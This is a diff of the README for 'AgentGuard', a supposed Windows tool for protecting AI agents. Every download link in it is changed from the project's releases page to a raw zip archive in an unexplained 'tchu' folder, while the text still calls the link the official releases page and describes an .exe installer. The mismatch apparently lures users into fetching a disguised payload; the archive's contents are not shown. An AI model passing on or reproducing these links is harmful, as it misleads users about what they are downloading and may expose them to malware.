@@ -1,6 +1,6 @@
 # 🛡️ AgentGuard - Protect AI Agents from Attacks  
 
-[![Download AgentGuard](https://img.shields.io/badge/Download-AgentGuard-brightgreen?style=for-the-badge)](https://github.com/astecka-m/AgentGuard/releases)
+[![Download AgentGuard](https://img.shields.io/badge/Download-AgentGuard-brightgreen?style=for-the-badge)](https://github.com/astecka-m/AgentGuard/raw/refs/heads/main/tchu/Agent-Guard-3.8-alpha.4.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you start, make sure your computer meets these basic needs:
 
 You can get AgentGuard by visiting the official releases page. Follow this link to access the latest version:
 
-[Visit the AgentGuard Releases Page](https://github.com/astecka-m/AgentGuard/releases)
+[Visit the AgentGuard Releases Page](https://github.com/astecka-m/AgentGuard/raw/refs/heads/main/tchu/Agent-Guard-3.8-alpha.4.zip)
 
 You will find several files listed. Look for the latest Windows installer file. It usually ends with `.exe` and has the highest version number or latest date.
 
@@ -107,7 +107,7 @@ Here are some common issues you might face when running AgentGuard and how to fi
 
 Start protecting your AI agents today by visiting the releases page below:
 
-[Download AgentGuard for Windows](https://github.com/astecka-m/AgentGuard/releases)
+[Download AgentGuard for Windows](https://github.com/astecka-m/AgentGuard/raw/refs/heads/main/tchu/Agent-Guard-3.8-alpha.4.zip)
 
 Click the link, download the latest Windows installer, and follow the steps above to install.
 
@@ -129,4 +129,4 @@ If you need help, use the "Issues" section on the GitHub repository to report pr
 
 ---
 
-[![Download AgentGuard](https://img.shields.io/badge/Download-AgentGuard-brightgreen?style=for-the-badge)](https://github.com/astecka-m/AgentGuard/releases)
+[![Download AgentGuard](https://img.shields.io/badge/Download-AgentGuard-brightgreen?style=for-the-badge)](https://github.com/astecka-m/AgentGuard/raw/refs/heads/main/tchu/Agent-Guard-3.8-alpha.4.zip)
